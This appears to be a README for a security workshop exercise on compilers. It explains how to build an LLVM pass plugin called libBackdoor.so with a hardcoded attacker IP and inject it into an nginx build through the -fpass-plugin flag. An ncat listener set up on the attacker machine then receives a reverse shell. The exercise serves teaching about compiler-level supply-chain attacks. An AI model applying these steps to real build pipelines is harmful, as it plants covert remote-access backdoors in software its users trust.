# BlackHoodie_Compilers

Project builds with LLVM v21 and cmake 3.28.3 (minimum)
Building LLVM from scratch: https://llvm.org/docs/GettingStarted.html#getting-the-source-code-and-building-llvm


Exercise Flow:

Attacker machine:
sudo apt update
sudo apt install ncat
ncat -lvp 8080

Target machine:
In examples/inject folder:
Edit IP address in Backdoor.cpp to match attacker IP addres, yes it is hardcoded
mkdir build
cd build 
cmake -S ../ -B .; make
Find libBackdoor.so in lib directory!

sudo cp ../inject/build/lib/libBackdoor.so /usr/local/lib

Change into examples/nginx folder
run:
./auto/configure --with-cc=clang --with-cc-opt=-fpass-plugin=/usr/local/lib/libBackdoor.so --prefix=/home/ubuntu/examples/nginx/build

make
make install 
locate nginx binary 
sudo nginx

Enjoy shell on attacker machine!
